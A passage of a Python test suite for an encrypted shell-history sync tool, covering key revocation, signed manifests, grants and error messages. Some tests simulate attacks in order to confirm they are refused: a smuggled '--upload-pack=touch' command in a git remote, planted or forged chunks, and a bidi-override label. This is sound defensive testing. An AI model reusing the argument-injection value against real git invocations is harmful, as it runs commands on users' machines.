        self.assertTrue(all(reader.shares_name for reader in readers))

    def test_a_name_nobody_else_uses_is_not_flagged(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            alpha.append_recipient(name="martin@desktop")
            self.assertFalse(any(reader.shares_name for reader in sync.readers()))

    def test_machines_whose_name_is_not_known_yet_do_not_count_as_duplicates(self) -> None:
        """Names arrive with a sync, so several can be pending at once.

        `(unnamed)` is a placeholder, not a name. Counting it as one turns the
        signal that means "look closely at these two" into something an ordinary
        first sync prints about every machine that has not been merged yet.
        """
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            for _ in range(3):
                alpha.append_recipient()
            unnamed = [r for r in sync.readers() if r.label == sync.UNNAMED]
            self.assertEqual(len(unnamed), 3)
            self.assertFalse(any(r.shares_name for r in unnamed))

            # And the placeholder is not a name a peer can claim its way into.
            # Sealing a `name.age` needs no secret, so anything spelled here can
            # be spelled there; two peers claiming it are told apart from a
            # machine whose name simply has not arrived.
            alpha.append_recipient(name=sync.UNNAMED)
            alpha.append_recipient(name=sync.UNNAMED)
            flagged = [r for r in sync.readers() if r.shares_name]
            self.assertEqual(len(flagged), 2)
            still_unknown = [r for r in sync.readers() if not r.shares_name]
            self.assertEqual(len([r for r in still_unknown if r.label == sync.UNNAMED]), 3)

            # A real repeat is still called out.
            alpha.append_recipient(name="martin@laptop")
            named = [r for r in sync.readers() if r.label == "martin@laptop"]
        self.assertEqual(len(named), 2)
        self.assertTrue(all(r.shares_name for r in named))

    def test_the_machine_the_human_is_sitting_at_is_marked(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            mine = crypto.recipient_for(sync.identity_path(store.machine())).strip()
            alpha.append_recipient(name="martin@desktop")
            marked = [reader.key for reader in sync.readers() if reader.is_mine]
        self.assertEqual(marked, [mine])


class TestRevokeSaysWhatItDid(SyncTestCase):
    """The CLI half of revoke, which nothing drove.

    `sync.revoke` is well covered below; `cmd_revoke` was not reached by any
    test at all, so the mutation deleting its confirmation line survived. That
    line is the only signal a user gets that a *security* operation happened --
    the command otherwise succeeds in silence, and "did that work?" is the
    question someone answers by revoking a second time.
    """

    def test_it_reports_the_revocation_and_the_resealing(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")
            fingerprint = crypto.fingerprint(gone)

        ran = self.run_cli(alpha, "revoke", fingerprint, "--yes")
        self.assertEqual(ran.code, 0, ran.out + ran.err)
        self.assertIn("revoked", ran.out)
        self.assertIn("re-sealed", ran.out)
        # Not merely "it printed something": the count is the part that says
        # whether the day keys were actually rewritten for the remaining readers.
        self.assertRegex(ran.out, r"re-sealed \d+ key file\(s\)")

        with alpha.active():
            self.assertNotIn(gone, sync.recipients())


class TestRevokeSubtraction(SyncTestCase):
    """A withdrawal has to survive `merge=union`, which never deletes a line."""

    def test_a_revoked_key_stops_being_a_recipient(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")
            self.assertIn(gone, sync.recipients())

            sync.revoke(sync.find_reader(crypto.fingerprint(gone)))
            self.assertNotIn(gone, sync.recipients())

    def test_a_tombstone_above_its_key_still_subtracts(self) -> None:
        """Union merges interleave two machines' appends in whatever order the
        rebase produces, so the withdrawal can land above the enrolment.

        Skipping tombstones as they are met, rather than collecting them in a
        pass of their own, would make this depend on line order.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            mine = sync.recipients()
            gone = crypto.generate_identity().public
            archive.recipients_file().write_text(
                f"-{gone}{sync._LABEL_SEP}revoked\n{gone}{sync._LABEL_SEP}old-laptop\n"
                + "".join(f"{key}\n" for key in mine),
                encoding="utf-8",
            )
            self.assertNotIn(gone, sync.recipients())

    def test_a_revoked_key_cannot_be_re_added(self) -> None:
        """Otherwise whoever the revocation was aimed at un-revokes themselves
        by appending the line again -- they have push access, that is the whole
        premise. Re-enrolling a real machine means a new identity."""
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")
            sync.revoke(sync.find_reader(crypto.fingerprint(gone)))

            with self.assertRaises(errors.SyncError) as caught:
                sync.add_recipient(gone)
            self.assertIn("revocation is permanent", str(caught.exception))

            # And appending the line by hand, which is all push access buys,
            # does not bring it back either.
            with archive.recipients_file().open("a", encoding="utf-8") as handle:
                handle.write(f"{gone}{sync._LABEL_SEP}back-again\n")
            self.assertNotIn(gone, sync.recipients())

    def test_revoking_re_seals_so_the_key_can_no_longer_open_the_repo(self) -> None:
        """The list is what future keys are minted from; this is what makes a
        copy of the repo taken *after* the revocation useless to that key."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            beta_identity = sync.identity_path(store.machine())
            beta_key = crypto.recipient_for(beta_identity).strip()

        with alpha.active():
            sync.grant(approved=[reader.key for reader in sync.readers()])
            sealed = archive.name_seal(store.machine().id)
            # Opens for beta here, which is what makes the failure below a
            # consequence of the revocation rather than of never having access.
            crypto.decrypt_with_file(sealed.read_bytes(), beta_identity)

            report = sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))
            self.assertGreater(report.resealed, 0)
            resealed = sealed.read_bytes()

        with self.assertRaises(crypto.AgeError):
            crypto.decrypt_with_file(resealed, beta_identity)

    def test_a_revoked_machine_cannot_read_history_recorded_afterwards(self) -> None:
        """The end-to-end claim, driven through real age and real git."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
        with alpha.active():
            sync.grant(approved=[reader.key for reader in sync.readers()])
            alpha.record("2023-11-14", 1_700_000_001, "before-revocation")
            sync.run()
        with beta.active():
            sync.run()
            self.assertIn("before-revocation", beta.commands())
            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()

        with alpha.active():
            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))
            # A fresh day, so the key is minted from the reduced list. Same-day
            # keys already exist and are reported as still readable instead.
            alpha.record("2023-11-15", 1_700_100_002, "after-revocation")
            sync.run()

        with beta.active():
            sync.run()
            self.assertNotIn("after-revocation", beta.commands())
        with alpha.active():
            self.assertIn("after-revocation", alpha.commands())

    def test_days_already_keyed_are_reported_rather_than_left_to_be_guessed(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "recorded today")
            sync.run()
            gone = alpha.append_recipient(name="old-laptop")
            report = sync.revoke(sync.find_reader(crypto.fingerprint(gone)))
        self.assertEqual(report.still_readable, ["2023-11-14"])

    def test_revoking_this_machine_is_refused(self) -> None:
        # It would seal the history away from the machine doing the sealing.
        alpha = self.machine("alpha")
        with alpha.active():
            (mine,) = [reader for reader in sync.readers() if reader.is_mine]
            with self.assertRaises(errors.SyncError) as caught:
                sync.revoke(mine)
        self.assertIn("lock this machine out", str(caught.exception))

    def test_revoking_the_only_other_machine_leaves_the_history_readable(self) -> None:
        """Sealing to an empty recipient list is how you lose an archive."""
        alpha = self.machine("alpha")
        with alpha.active():
            # Only one recipient, and it is not this machine -- so `is_mine`
            # does not catch it and the emptiness guard is what has to.
            archive.recipients_file().write_text("", encoding="utf-8")
            only = alpha.append_recipient(name="only-one")
            (other,) = sync.readers()
            with self.assertRaises(errors.SyncError) as caught:
                sync.revoke(other)
            self.assertIn(only, sync.recipients())
        self.assertIn("only machine left", str(caught.exception))

    def test_the_revoked_machine_is_told_that_rather_than_to_ask_for_a_grant(self) -> None:
        """It is the machine that can no longer decrypt anything, so it is also
        the one that would otherwise see "ask someone to run grant" forever."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()
        with alpha.active():
            sync.grant(approved=[reader.key for reader in sync.readers()])
            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))

        with beta.active():
            report = sync.run()
        self.assertTrue(report.revoked)

        buffer = io.StringIO()
        with beta.active(), redirect_stderr(buffer):
            self.assertEqual(main(["sync"]), 0)
        message = buffer.getvalue()
        self.assertIn("was revoked", message)
        self.assertNotIn(_GRANT_REMEDY, message)

    def test_a_machine_merely_waiting_for_a_grant_is_not_told_it_was_revoked(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            # Published *before* beta exists, so its day key is sealed to a list
            # beta is not on. That is the only thing `grant` is still needed for.
            alpha.record("2023-11-14", 1_700_000_001, "sealed before beta joined")
            sync.run()
        beta = self.machine("beta")
        with beta.active():
            report = sync.run()
        self.assertTrue(
            report.subjects(sync.UNREADABLE), "beta is waiting for a grant, not revoked"
        )
        self.assertFalse(report.revoked)

    def test_a_key_shaped_like_a_tombstone_is_refused(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(errors.SyncError) as caught:
            sync.add_recipient(f"-{crypto.generate_identity().public}")
        self.assertIn("may not start with", str(caught.exception))


class TestARevokedMachineCannotPublish(SyncTestCase):
    """Issue #38, which is the whole point of per-machine signatures.

    A revoked machine keeps its own signing key -- nobody can take it back --
    and keeps every manifest it ever signed. What it loses is any peer willing
    to accept them. That is only expressible because signing is asymmetric: with
    the shared MAC these tests replaced, holding the key to *check* a chunk was
    holding the key to *forge* one, so a revoked machine could publish forever.
    """

    def fleet(self) -> tuple[Fake, Fake, Fake]:
        """alpha and beta enrolled and readable, gamma accepting both."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        gamma = self.machine("gamma")
        with alpha.active():
            # alpha publishes, so its day key exists for the cross-host test to
            # seal against -- which is exactly what an attacker would find.
            alpha.record("2023-11-14", 1_700_000_000, "alpha-history")
            sync.run()
            sync.grant(approved=[reader.key for reader in sync.readers()])
        for machine in (beta, gamma):
            with machine.active():
                sync.run()
        for machine in (alpha, beta, gamma):
            self.accept_everyone(machine)
        return alpha, beta, gamma

    def publish_as_revoked(self, beta: Fake, day: str, ts: int, cmd: str) -> None:
        """Everything beta can still do: seal, sign with its own key, push.

        Deliberately not `sync.run`, which would notice beta is revoked and stop.
        The question is not whether beta cooperates -- it is whether refusing
        beta is a *decision the peers make*.
        """
        with beta.active():
            beta.record(day, ts, cmd)
            known = store.machine()
            with sync.lock():
                gitrepo.fetch_and_rebase(gitrepo.read_repo())
                sync.export(known, sync.State.load(), sync.Report(), ts)
                gitrepo.commit()
                gitrepo.push(gitrepo.read_repo())

    def revoke_beta(self, alpha: Fake, beta: Fake) -> None:
        with beta.active():
            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()
        with alpha.active():
            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))

    def test_a_peer_refuses_what_a_revoked_machine_signs_afterwards(self) -> None:
        alpha, beta, gamma = self.fleet()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_001, "legitimate-beta-history")
            sync.run()
        with gamma.active():
            sync.run()
            self.assertIn("legitimate-beta-history", gamma.commands())

        self.revoke_beta(alpha, beta)
        self.publish_as_revoked(beta, "2023-11-15", 1_700_100_002, "after-the-revocation")

        with gamma.active():
            report = sync.run()
            self.assertIn(beta.id, report.subjects(sync.UNPINNED))
            self.assertNotIn("after-the-revocation", gamma.commands())

    def test_it_cannot_publish_under_another_machines_id_either(self) -> None:
        """The cross-host version, and the one a shared key could never stop.

        beta writes into *alpha's* host directory, where alpha would never look
        -- `merge` skips your own id -- so only the other peers judge it. It can
        seal the chunk perfectly well; what it cannot do is sign as alpha.
        """
        alpha, beta, gamma = self.fleet()
        self.revoke_beta(alpha, beta)

        with beta.active():
            day = "2023-11-14"
            with sync.lock():
                gitrepo.fetch_and_rebase(gitrepo.read_repo())
                pub = archive.day_key_public(alpha.id, day)
                entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "planted-under-alpha")
                sealed = crypto.encrypt_to(
                    sync.pack((format_line(entry) + "\n").encode("utf-8")),
                    pub.read_text(encoding="utf-8").strip(),
                )
                target = archive.chunk_dir(alpha.id, day) / "9999999999-ffffff.age"
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(sealed)
                gitrepo.commit()
                gitrepo.push(gitrepo.read_repo())

        with gamma.active():
            sync.run()
            self.assertNotIn("planted-under-alpha", gamma.commands())

    def test_a_replayed_manifest_from_before_the_revocation_is_refused_too(self) -> None:
        """beta keeps every manifest it signed; unpinning covers the old ones."""
        alpha, beta, gamma = self.fleet()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_001, "before-revocation")
            sync.run()
        self.revoke_beta(alpha, beta)

        with gamma.active():
            sync.run()  # sees the tombstone and drops the pin
            report = sync.run()
            self.assertNotIn(beta.id, sync.State.load().signers)
            self.assertIn(beta.id, report.subjects(sync.UNTRUSTED))

    def test_trust_will_not_re_accept_a_revoked_machine(self) -> None:
        """Otherwise the withdrawal is a suggestion: whoever it was aimed at
        holds push access, so it could simply republish and be offered again."""
        alpha, beta, gamma = self.fleet()
        self.revoke_beta(alpha, beta)
        with gamma.active():
            sync.run()
            offered = [c.host_id for c in sync.trust_candidates()]
        self.assertNotIn(beta.id, offered)


class TestExportNeverSignsWhatItDidNotWrite(SyncTestCase):
    """`merge` skips this host's own id, so a chunk planted under it is the one
    thing nothing else ever inspects.

    If `export` built its manifest by listing the day's directory, an ordinary
    sync would sign that chunk and hand every peer something they believe --
    without even the `compact` run the old design needed. So the manifest is
    *extended* from the one this machine last signed, never rebuilt from disk.
    """

    def test_a_chunk_planted_under_our_own_id_is_never_signed(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()

            planted = archive.chunk_dir(alpha.id, "2023-11-14") / "9999999999-ffffff.age"
            planted.write_bytes(b"whatever an attacker likes")

            alpha.record("2023-11-14", 1_700_000_002, "ours too")
            report = sync.run(now=1_900_000_000)

            listed = manifest.read(
                alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
            )
            self.assertNotIn(planted.name, listed, "export signed a chunk it did not write")
            self.assertIn(f"2023-11-14/{planted.name}", report.subjects(sync.FOREIGN))

    def test_a_peer_refuses_the_planted_chunk(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
            entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "planted")
            pub = archive.day_key_public(alpha.id, "2023-11-14").read_text(encoding="utf-8").strip()
            sealed = crypto.encrypt_to(sync.pack((format_line(entry) + "\n").encode("utf-8")), pub)
            (archive.chunk_dir(alpha.id, "2023-11-14") / "9999999999-ffffff.age").write_bytes(
                sealed
            )
            alpha.record("2023-11-14", 1_700_000_002, "ours too")
            sync.run(now=1_900_000_000)

        with beta.active():
            sync.run()
            self.assertNotIn("planted", beta.commands())
            self.assertIn("ours too", beta.commands())


class TestFindReader(SyncTestCase):
    """Revocation is by fingerprint: the name is the part an attacker writes."""

    def test_a_full_fingerprint_selects_one_machine(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            other = alpha.append_recipient(name="old-laptop")
            self.assertEqual(sync.find_reader(crypto.fingerprint(other)).key, other)

    def test_an_unambiguous_prefix_is_enough(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            other = alpha.append_recipient(name="old-laptop")
            found = sync.find_reader(crypto.fingerprint(other)[:20])
        self.assertEqual(found.key, other)

    def test_an_ambiguous_prefix_is_refused_rather_than_resolved(self) -> None:
        # Guessing here removes somebody's access.
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.append_recipient(name="old-laptop")
            with self.assertRaises(errors.SyncError) as caught:
                sync.find_reader("age1")
        self.assertIn("matches 2 machines", str(caught.exception))

    def test_a_fingerprint_nobody_has_is_refused(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(errors.SyncError) as caught:
            sync.find_reader("SHA256:nothing-like-this")
        self.assertIn("no enrolled machine", str(caught.exception))


class TestRevokeConfirmation(SyncTestCase):
    def test_without_yes_and_without_a_terminal_nothing_changes(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")

        code, _, _ = self.run_cli(alpha, "revoke", crypto.fingerprint(gone))
        self.assertEqual(code, 1)
        with alpha.active():
            self.assertIn(gone, sync.recipients())

    def test_the_limits_are_stated_before_the_decision(self) -> None:
        """They are the reasons someone would answer no and go do something
        else first, so printing them after the fact is printing them too late.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")

        code, out, _ = self.run_cli(alpha, "revoke", crypto.fingerprint(gone), "--yes")
        self.assertEqual(code, 0)
        self.assertIn("does not un-publish", out)
        self.assertIn("does not revoke git access", out)
        self.assertIn("nothing that machine publishes is accepted", out)
        with alpha.active():
            self.assertNotIn(gone, sync.recipients())


class TestCrashDebrisIsNotCalledAnIntruder(SyncTestCase):
    """Issue #66: the same evidence has two explanations, and one is ordinary.

    `export` writes a chunk and then signs the day's list. Killed between the
    two, it leaves a chunk in no manifest -- and `state.save()` never ran, so the
    next sync republishes those lines under a chunk that *is* signed. Nothing is
    lost and nothing is duplicated; the abandoned one is inert for ever.

    It used to be reported as "someone else can write into this repository",
    which sends a user hunting an intruder after a power cut.
    """

    def debris(self) -> tuple[Fake, str]:
        """One chunk left behind by a run that died before signing."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "one")
            sync.run()
            before = set(archive.chunk_names(alpha.id, "2023-11-14"))

            alpha.record("2023-11-14", 1_700_000_002, "two")

            def die(*args: object, **kwargs: object) -> None:
                raise KeyboardInterrupt("power cut")

            with (
                contextlib.suppress(KeyboardInterrupt),
                mock.patch.object(manifest, "write", die),
            ):
                sync.run()
            left = set(archive.chunk_names(alpha.id, "2023-11-14")) - before
        self.assertEqual(len(left), 1, "precondition: a chunk was left unsigned")
        return alpha, left.pop()

    def test_nothing_is_lost_and_nothing_is_duplicated(self) -> None:
        """The claim the message makes, checked rather than asserted in prose."""
        alpha, _stray = self.debris()
        with alpha.active():
            self.assertTrue(sync.run().subjects(sync.FOREIGN))
            self.assertEqual(alpha.commands(), {"one", "two"})
            self.assertEqual(len(alpha.entries()), 2, "a line was published twice")

    def test_it_does_not_accuse_anyone(self) -> None:
        alpha, _stray = self.debris()
        said = self.run_cli(alpha, "sync").err
        self.assertIn("never signed", said)
        self.assertIn("killed between writing a chunk and signing", said)
        self.assertNotIn("someone else can write into this repository", said)

    def test_doctor_lists_it(self) -> None:
        """The message points there, so the pointer has to be true.

        `unlisted_chunks` reports every host, including this one, which is what
        makes it the right place to send someone -- `sync` says it once and then
        the day settles.
        """
        alpha, stray = self.debris()
        with alpha.active():
            sync.run()
            self.assertEqual(sync.unlisted_chunks(), [(alpha.id, "2023-11-14", 1)])
        self.assertRegex(self.run_cli(alpha, "doctor").out, r"\[FAIL\] chunks .*no signed list")
        del stray


class TestDoctorFindsAChunkNobodySigned(SyncTestCase):
    """Issue #90: `sync` says it once, then the day settles and it stops.

    Right for a one-minute timer -- #87 -- and no use to somebody asking
    afterwards, especially as that one report most likely went to a journal.
    """

    DAY = "2023-11-14"

    def planted(self, machine: Fake, host: Fake, name: str = "1700000000-dead.age") -> None:
        with machine.active():
            (archive.chunk_dir(host.id, self.DAY) / name).write_bytes(b"not a chunk anyone signed")

    def test_it_is_found_after_sync_has_stopped_saying_so(self) -> None:
        alpha, beta = self.history_across_days(days=1, per_day=2)
        with beta.active():
            sync.run()
        self.planted(beta, alpha)

        with beta.active():
            # Said once...
            self.assertIn(f"{alpha.id}/{self.DAY}", sync.run().subjects(sync.UNAUTHENTICATED))
        # Settling moves the mtime, so one more pass records the stamp; the one
        # after it is the quiet steady state this exists for.
        self.settle(beta, alpha, self.DAY)
        with beta.active():
            sync.run()
            self.assertEqual(
                sync.run().subjects(sync.UNAUTHENTICATED), set(), "precondition: it settled"
            )

            # ...and still answerable.
            self.assertEqual(sync.unlisted_chunks(), [(alpha.id, self.DAY, 1)])
        # The line, not just the exit code: this fixture has other findings, so
        # a non-zero exit would be true whether or not the check existed.
        self.assertRegex(self.run_cli(beta, "doctor").out, r"\[FAIL\] chunks .*no signed list")

    def test_a_clean_repo_says_so_and_forks_nothing(self) -> None:
        """The design: a signature check only where there is something to check.

        Verifying every day's manifest would be an `ssh-keygen` fork per
        host-day -- thousands on a real archive -- to answer "nothing here" in
        the case that is always true.
        """
        _alpha, beta = self.history_across_days(days=3, per_day=1)
        with beta.active():
            sync.run()

            spawns = 0
            real = subprocess.run

            def counted(argv: list[str], *args: Any, **kwargs: Any) -> Any:
                nonlocal spawns
                spawns += 1
                return real(argv, *args, **kwargs)

            with mock.patch.object(subprocess, "run", counted):
                self.assertEqual(sync.unlisted_chunks(), [])
            self.assertEqual(spawns, 0, "a clean repo paid for signature checks")

        self.assertIn("all accounted for", self.run_cli(beta, "doctor").out)

    def test_a_manifest_that_will_not_verify_is_not_reported_as_planted(self) -> None:
        """Otherwise one broken signature reads as every chunk being forged.

        That state has its own name -- `sync` reports the day unauthenticated
        and every peer refuses all of it -- and calling it "somebody planted
        three chunks" would point at the wrong thing entirely.
        """
        alpha, beta = self.history_across_days(days=1, per_day=2)
        with beta.active():
            sync.run()
            archive.day_manifest(alpha.id, self.DAY).write_text("wrecked", encoding="utf-8")
            self.assertEqual(sync.unlisted_chunks(), [])

    def test_a_host_this_machine_has_not_pinned_is_not_even_checked(self) -> None:
        """Nothing to check its manifests against, so there is nothing to learn.

        Reporting is unaffected either way -- an unverifiable manifest accounts
        for nothing, and the guard against *that* already suppresses it. What
        the skip buys is the `ssh-keygen` per day that asking anyway would cost,
        on precisely the host where the answer is known in advance.
        """
        alpha, _beta = self.history_across_days(days=1, per_day=2)
        gamma = self.machine("gamma")  # cloned after alpha, so alpha *is* pinned
        self.planted(gamma, alpha)
        with gamma.active():
            state = sync.State.load()
            del state.signers[alpha.id]
            state.save()

            spawns = 0
            real = subprocess.run

            def counted(argv: list[str], *args: Any, **kwargs: Any) -> Any:
                nonlocal spawns
                spawns += 1
                return real(argv, *args, **kwargs)

            with mock.patch.object(subprocess, "run", counted):
                self.assertEqual(sync.unlisted_chunks(), [])
            self.assertEqual(spawns, 0, "an unpinned host was checked anyway")


class TestARemoteIsAnAddressNotAnOption(SyncTestCase):
    """Issue #26: `git clone --upload-pack=<cmd>` runs <cmd>.

    `woswoar init -- --upload-pack=...` reaches argparse as a positional,
    because `--` ends *woswoar's* option parsing and hands the rest through. It
    is the user's own URL, so this is low severity -- until the URL comes from a
    README, a chat message, or a provisioning script that wraps `init`.
    """

    def test_a_remote_that_would_run_a_command_does_not(self) -> None:
        """The attack, not the message: a witness file must never appear."""
        witness = self.root / "OWNED"
        hostile = f"--upload-pack=touch {witness}"

        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(errors.SyncError) as refused:
            sync.initialise(remote=hostile)
        self.assertIn("may not start with", str(refused.exception))
        self.assertFalse(witness.exists(), "the remote was executed")

    def test_git_is_told_where_the_options_end(self) -> None:
        """The guard behind the message, so one is not the only defence.

        A remote reaching `git clone` unseparated is an option to git whatever
        woswoar checked first, and the check is a string comparison that a later
        edit could narrow.
        """
        seen: list[tuple[str, ...]] = []
        real = gitrepo.git

        def spy(*args: str, **kwargs: object) -> str:
            seen.append(args)
            return real(*args, **kwargs)  # type: ignore[arg-type]

        # A machine that has never been set up, because those are the only two
        # calls that are ever handed a remote -- an already-initialised one
        # clones nothing and this would watch an empty list.
        with mock.patch.object(gitrepo, "git", spy):
            alpha = self.machine("alpha")

        # `remote add` is only reached when the repo was *not* cloned -- a clone
        # sets origin itself. That is `woswoar init` with no remote, and a
        # remote given later; without it this watches the clone alone.
        with alpha.active():
            gitrepo.git("remote", "remove", "origin")
            with mock.patch.object(gitrepo, "git", spy):
                sync.initialise(remote=str(self.origin))

        handed = [call for call in seen if call[:1] == ("clone",) or call[:2] == ("remote", "add")]
        self.assertTrue(handed, "precondition: no call was handed the remote")
        for call in handed:
            self.assertIn("--", call, f"no separator before the remote: {call}")
            self.assertLess(
                call.index("--"),
                call.index(str(self.origin)),
                f"the separator comes after the remote: {call}",
            )

    def test_an_ordinary_remote_still_works(self) -> None:
        """`--` must not break the thing it guards."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            self.assertTrue(sync.run().pushed)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status"})


class TestGrantDoesNotRepeatItself(SyncTestCase):
    """Issue #35: re-sealing a key file that is already sealed to everyone.

    `grant` opens and re-seals every day key of every host, two `age` forks
    apiece, to produce different ciphertext of identical plaintext for an
    identical recipient list. On 120 days across two machines that is 255
    subprocesses and 575 ms; it grows with the history, and the command is run
    by hand.
    """

    def granting_pair(self) -> tuple[Fake, Fake]:
        alpha, beta = self.history_across_days(days=3, per_day=1)
        with beta.active():
            sync.run()
        return alpha, beta

    def sealed(self, machine: Fake) -> int:
        """Key files one `grant` actually rewrites."""
        with machine.active():
            return sync.grant(approved=[reader.key for reader in sync.readers()]).resealed

    def test_a_second_grant_with_nothing_new_seals_nothing(self) -> None:
        alpha, beta = self.granting_pair()
        self.assertGreater(self.sealed(alpha), 0, "precondition: the first grant did work")
        self.assertEqual(self.sealed(alpha), 0, "it re-sealed an unchanged list")

        # And access is unchanged, which is the only thing that matters about
        # skipping the work.
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 3)

    def test_a_machine_that_enrols_later_is_still_sealed_to(self) -> None:
        """The half that would silently stop granting if the skip overreached."""
        alpha, _beta = self.granting_pair()
        self.sealed(alpha)
        self.assertEqual(self.sealed(alpha), 0)

        gamma = self.machine("gamma")  # enrols, so the recipient list changes
        self.assertGreater(self.sealed(alpha), 0, "a new machine was not sealed to")
        with gamma.active():
            sync.run()
            self.assertEqual(len(gamma.commands()), 3)

    def test_a_partial_grant_is_not_remembered_as_complete(self) -> None:
        """The subtlety that makes "nothing new" insufficient on its own.

        A machine that cannot open a key file leaves it sealed to the older,
        smaller list. The recipient list is unchanged either way, so a gate that
        looked only at that would skip for ever and those files would never be
        re-sealed -- and the machines they were missing would never read those
        days.
        """
        alpha, _beta = self.granting_pair()
        gamma = self.machine("gamma")

        # gamma has never been granted, so it can open none of the keys.
        with gamma.active():
            partial = sync.grant(approved=[reader.key for reader in sync.readers()])
            # Its own key it can open; every other host's it cannot.
            self.assertGreater(partial.skipped, 0, "precondition: gamma was left work undone")
            self.assertFalse(sync.State.load().granted_complete)

        # Now gamma is granted by a machine that can, and gamma tries again. The
        # recipient list has not moved, but the last pass left files behind.
        self.assertGreater(self.sealed(alpha), 0)
        with gamma.active():
            sync.run()
            self.assertGreater(
                sync.grant(approved=[reader.key for reader in sync.readers()]).resealed,
                0,
                "a partial grant was remembered as complete",
            )

    def test_it_says_nothing_to_do_rather_than_re_sealed_zero(self) -> None:
        alpha, _beta = self.granting_pair()
        self.sealed(alpha)
        ran = self.run_cli(alpha, "grant", "--yes")
        self.assertEqual(ran.code, 0)
        self.assertIn("nothing to do", ran.out)
        self.assertNotIn("re-sealed 0", ran.out)


class TestGrantConfirmsAdditions(SyncTestCase):
    """A confirmation listing everything makes the one new line easy to miss."""

    def test_the_first_grant_reports_every_machine_as_new(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            self.assertTrue(all(reader.is_new for reader in sync.readers()))

    def test_granting_remembers_who_was_approved(self) -> None:
        alpha = self.machine("alpha")
        code, _, _ = self.run_cli(alpha, "grant", "--yes")
        self.assertEqual(code, 0)
        with alpha.active():
            self.assertFalse(any(reader.is_new for reader in sync.readers()))

    def test_a_grant_nobody_approved_does_not_silence_the_next_prompt(self) -> None:
        """Omitting `approved` means no human saw a list, so there was no
        decision to remember."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.grant()
            self.assertTrue(all(reader.is_new for reader in sync.readers()))

    def test_a_key_appended_afterwards_is_the_only_one_reported_as_new(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        self.run_cli(alpha, "grant", "--yes")

        # Exactly what push access alone buys: append a key labelled like one of
        # the machines that is already there.
        with alpha.active():
            forged = alpha.append_recipient(name="martin@laptop")
            new = [reader for reader in sync.readers() if reader.is_new]

        self.assertEqual([reader.key for reader in new], [forged])

    def test_a_new_key_is_put_to_the_human_even_with_a_familiar_name(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        self.run_cli(alpha, "grant", "--yes")
        with alpha.active():
            alpha.append_recipient(name="martin@laptop")

        code, out, _ = self.run_cli(alpha, "grant", "--yes")
        self.assertEqual(code, 0)
        self.assertIn("1 machine(s) NOT yet granted", out)
        self.assertIn("SAME NAME AS ANOTHER KEY", out)

    def test_no_label_can_put_an_escape_sequence_on_the_prompt(self) -> None:
        """The second half of the defence, and independent of the first.

        `make_inert` handles C0; printing with `repr` covers what is left --
        anything Python calls unprintable, a bidi override among them -- and
        quotes the label so leading whitespace is visible rather than shifting
        the line it is on.
        """
        # U+202E flips the direction of everything after it, and is neither a
        # control character nor anything `make_inert` touches.
        hostile = "  martin@desktop\u202e"
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            alpha.append_recipient(name=hostile)

        _, out, _ = self.run_cli(alpha, "grant", "--yes")
        self.assertIn("martin@desktop", out)
        self.assertNotIn(hostile, out)
        self.assertNotIn("\u202e", out)

    def test_re_sealing_to_an_unchanged_set_does_not_ask(self) -> None:
        """Nothing is widened, so there is nothing to consent to -- and a prompt
        that fires when there is nothing to decide is one people stop reading.

        Driven without `--yes` and without a terminal, which is exactly what the
